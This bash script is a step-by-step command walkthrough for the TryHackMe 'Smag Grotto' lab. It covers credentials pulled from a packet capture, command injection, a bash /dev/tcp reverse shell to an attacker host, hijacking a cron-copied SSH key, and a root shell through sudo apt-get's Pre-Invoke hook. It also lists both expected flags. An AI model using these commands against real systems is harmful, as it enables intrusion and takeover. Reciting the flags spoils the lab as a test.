#!/bin/bash

# Smag Grotto - Complete command reference
# Run only inside the authorized TryHackMe lab.
# Usage: ./all_tasks.sh <TARGET_IP> <ATTACKER_IP>

set -u

TARGET_IP="${1:-<TARGET_IP>}"
ATTACKER_IP="${2:-<ATTACKER_IP>}"
VHOST="development.smag.thm"
PCAP="dHJhY2Uy.pcap"

# 1. Network and web enumeration
nmap -sC -sV -p- "$TARGET_IP" -oN nmap_full.txt
curl -I "http://$TARGET_IP"
whatweb "http://$TARGET_IP"
nikto -h "http://$TARGET_IP"

# 2. Decode the attachment path components
echo 'aW1wb3J0YW50' | base64 -d
echo
echo 'dHJhY2Uy' | base64 -d
echo

# 3. Download and inspect the exposed packet capture
wget "http://$TARGET_IP/aW1wb3J0YW50/$PCAP"
file "$PCAP"
tshark -r "$PCAP"
tshark -r "$PCAP" -Y 'http.request.method == POST' -V

# Recovered from the PCAP:
# Host: development.smag.thm
# Username: helpdesk
# Password: cH4nG3M3_n0w

# 4. Add the virtual host to /etc/hosts, then authenticate in the browser
echo "$TARGET_IP $VHOST" | sudo tee -a /etc/hosts
# Login URL: http://development.smag.thm/login.php

# 5. Confirm blind command injection
# Start this server on the attacking machine:
python3 -m http.server 8000
# Submit this value through the authenticated command field:
# curl http://<ATTACKER_IP>:8000/proof

# 6. Obtain the reverse shell
# Start the listener on the attacking machine:
nc -lvnp 4444
# Submit this payload through the command field:
# bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
# Replace <ATTACKER_IP> with: $ATTACKER_IP

# 7. Enumerate the target from the www-data shell
id
ls -la /home
ls -la /home/jake
getcap -r / 2>/dev/null

# Inspect scheduled tasks and the key backup permissions:
cat /etc/crontab
ls -la /opt/.backups/jake_id_rsa.pub.backup

# Vulnerable cron entry:
# * * * * * root /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys

# 8. Generate the attacker-controlled SSH key pair on the attacking machine
ssh-keygen -t rsa -f thm_jake
cat thm_jake.pub

# From the www-data shell, replace the writable backup with the public key:
# echo '<YOUR_PUBLIC_KEY>' > /opt/.backups/jake_id_rsa.pub.backup
# cat /opt/.backups/jake_id_rsa.pub.backup

# 9. Wait approximately one minute, then connect as Jake
chmod 600 thm_jake
ssh -i thm_jake "jake@$TARGET_IP"

# 10. Retrieve the user flag and enumerate sudo permissions
cat /home/jake/user.txt
sudo -l

# 11. Abuse the permitted apt-get pre-invoke hook to obtain a root shell
sudo apt-get update -o APT::Update::Pre-Invoke=/bin/sh

# 12. Verify root access and retrieve the final flag
whoami
cat /root/root.txt

# Expected flags:
# User: iusGorV7EbmxM5AuIe2w499msaSuqU3
# Root: uJr6zRgetaniyHVRqqL58uRasybBKz2T
